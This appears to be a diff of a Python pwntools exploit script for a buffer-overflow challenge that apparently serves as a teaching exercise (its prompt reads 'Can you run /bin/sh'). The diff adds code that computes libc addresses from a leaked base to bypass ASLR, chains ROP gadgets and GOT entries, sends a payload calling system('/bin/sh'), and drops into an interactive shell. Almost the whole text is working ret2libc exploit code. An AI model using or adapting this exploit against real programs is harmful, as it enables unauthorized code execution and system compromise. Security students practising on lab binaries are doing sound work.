@@ -6,22 +6,22 @@ import binascii
 DEBUG = False
 
 
+# addresses valid for disabled aslr:
 system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
 exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
 bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]
 
+# filler:
 buffer = 128 * b"a"  # 0x61
 backup_base_pointer = 8 * b"b"
-backup_instruction_pointer = system_call
 
+# addresses valid with enabled aslr:
 rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
 rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
-
 double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
 puts_got = b"\x00\x00\x00\x00\x00\x40\x3f\xc8"[::-1]
 flush_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd0"[::-1]
 scanf_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd8"[::-1]
-
 copy_line4 = b"\x00\x00\x00\x00\x00\x40\x11\x46"[::-1]
 main_line0 = b"\x00\x00\x00\x00\x00\x40\x11\x69"[::-1]
 
@@ -102,13 +102,31 @@ exit_offset = 0x3F100
 
 #######
 
+bin_sh_string = bin_sh_offset + libc_start
+system_call = system_offset + libc_start
+exit_call = exit_offset + libc_start
+
 print("\ncalculated addresses:")
-print("/bin/sh:", hex(bin_sh_offset + libc_start), "(gdb> x/s 0x...)")
-print("system():", hex(system_offset + libc_start), "(gdb> x/i 0x...)")
-print("exit():", hex(exit_offset + libc_start), "(gdb> x/i 0x...)")
+print("/bin/sh:", hex(bin_sh_string), "(gdb> x/s 0x...)")
+print("system():", hex(system_call), "(gdb> x/i 0x...)")
+print("exit():", hex(exit_call), "(gdb> x/i 0x...)")
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print("\n", r, "\n", sep="")
+
+x = bytearray.fromhex(hex(bin_sh_string)[2:])
+x = b"\x00\x00" + x
+bin_sh_string = x[::-1]
+
+x = bytearray.fromhex(hex(system_call)[2:])
+x = b"\x00\x00" + x
+system_call = x[::-1]
+
+
+x = bytearray.fromhex(hex(exit_call)[2:])
+x = b"\x00\x00" + x
+exit_call = x[::-1]
+
 
 # this payload uses the calculated offset to pop a shell:
 payload2 = (
@@ -123,5 +141,4 @@ payload2 = (
 print("> sending second payload")
 p.sendline(payload2)
 
-if DEBUG:
-    p.interactive()
+p.interactive()
